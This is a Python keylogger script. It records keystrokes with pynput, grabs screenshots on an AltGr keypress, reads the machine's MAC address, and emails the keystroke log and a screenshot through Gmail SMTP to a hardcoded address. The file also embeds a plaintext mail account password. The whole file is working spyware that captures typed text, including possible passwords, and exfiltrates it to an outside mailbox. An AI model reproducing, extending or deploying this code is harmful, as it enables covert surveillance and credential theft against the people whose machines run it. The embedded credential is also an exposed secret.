from fileinput import filename
import pynput
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders
import os
import re, uuid

count = 0
keys = []
now = datetime.now()
screenShot_Number = 0
strrr = ":".join(re.findall("..", "%012x" % uuid.getnode()))


def screenShot():
    global screenShot_Number
    img = ImageGrab.grab()
    screenShot_Number += 1
    img.save("D:\\pythonProject\\keySaver\\screenshot{0}.png".format(screenShot_Number))


def write_list(keys):
    write_file(keys)


def on_press(key):
    global keys, count
    print(now)
    keys.append(key)
    print(keys)
    count += 1
    print("{0} pressed".format(key))
    if count > 10:
        count = 0
        write_list(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        # f.write(str(now) + "\n")

        for keyo in keys:
            k = str(keyo).replace("'", "")
            if k.find("space") > 0:
                f.write("\t")
            elif k.find("Key") == -1:
                f.write(k)
            elif k.find("enter") > 0:
                f.write("\n")
            elif k.find("alt_gr") > 0:
                f.write("screenShote")
                screenShot()


def on_release(key):
    if key == Key.end:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


# mail server parameters
smtpHost = "smtp.gmail.com"
smtpPort = 587
mailUname = "fsbkeylogger@gmail.com"
mailPwd = "mmolcckavuwbzvgw"
fromEmail = "fsbkeylogger@gmail.com"


# mail body, recepients, attachment files
mailSubject = "test subject"
mailContentHtml = "this was writen at {0}\n".format(now) + strrr
recepientsMailList = ["fsbkeylogger@gmail.com"]
attachmentFpaths = ["screenshot{0}.png".format(screenShot_Number), "log.txt"]


def sendEmail(
    smtpHost,
    smtpPort,
    mailUname,
    mailPwd,
    fromEmail,
    mailSubject,
    mailContentHtml,
    recepientsMailList,
    attachmentFpaths,
):
    # create message object
    msg = MIMEMultipart()
    msg["From"] = fromEmail
    msg["To"] = ",".join(recepientsMailList)
    msg["Subject"] = mailSubject
    # msg.attach(MIMEText(mailContentText, 'plain'))
    msg.attach(MIMEText(mailContentHtml, "html"))

    # create file attachments
    for aPath in attachmentFpaths:
        # check if file exists
        part = MIMEBase("application", "octet-stream")
        part.set_payload(open(aPath, "rb").read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            'attachment; filename="{0}"'.format(os.path.basename(aPath)),
        )
        msg.attach(part)

    # Send message object as email using smptplib
    s = smtplib.SMTP(smtpHost, smtpPort)
    s.starttls()
    s.login(mailUname, mailPwd)
    msgText = msg.as_string()
    sendErrs = s.sendmail(fromEmail, recepientsMailList, msgText)
    s.quit()

    # check if errors occured and handle them accordingly
    if not len(sendErrs.keys()) == 0:
        raise Exception("Errors occurred while sending email", sendErrs)


sendEmail(
    smtpHost,
    smtpPort,
    mailUname,
    mailPwd,
    fromEmail,
    mailSubject,
    mailContentHtml,
    recepientsMailList,
    attachmentFpaths,
)

print("The MAC address in formatted and less complex way is : ", end="")

print(":".join(re.findall("..", "%012x" % uuid.getnode())))
print("execution complete...")
